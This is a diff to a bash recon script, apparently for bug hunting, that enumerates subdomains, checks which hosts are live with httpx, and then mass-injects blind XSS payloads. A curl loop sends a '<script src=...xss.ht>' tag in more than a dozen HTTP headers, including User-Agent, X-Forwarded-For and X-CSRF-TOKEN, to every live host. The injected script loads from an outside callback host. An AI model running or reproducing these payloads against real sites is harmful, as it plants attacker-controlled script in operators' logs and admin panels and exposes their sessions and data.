@@ -27,15 +27,16 @@ wc -l <  $1subdomain.txt
  echo "enumeration subdomain  successfully  " 
 sleep 1
 
+echo "enumeration httpx  successfully  " 
+httpx -l $1subdomain.txt  >> $1live.txt
+
+wc -l <  $1live.txt
+
 
 #blindxss
 
 
-httpx -l $1subdomain.txt -H "X-Forwarded-for: ><script src=https://husseinphp23.xss.ht></script>" -H "X-forwarded-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "cf-connecting-ip: ><script src=https://husseinphp23.xss.ht></script>"
-
-sleep 1
-
-httpx -l $1subdomain.txt  -H "X-Client-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "X-real-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "X-request-uri: ><script src=https://husseinphp23.xss.ht></script>" \  -H "X-XSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>" -H "X-CSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>"
+while read line; do curl -sSf $line -Is  -H 'User-Agent: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Host: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Requested-With: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-For: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Forwarded-Proto: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Correlation-ID: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-real-ip: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-request-uri: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"' -H 'cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"' | head -n 1; done < $1live.txt
 
 
  echo " BLIND XSS  successfully  " 
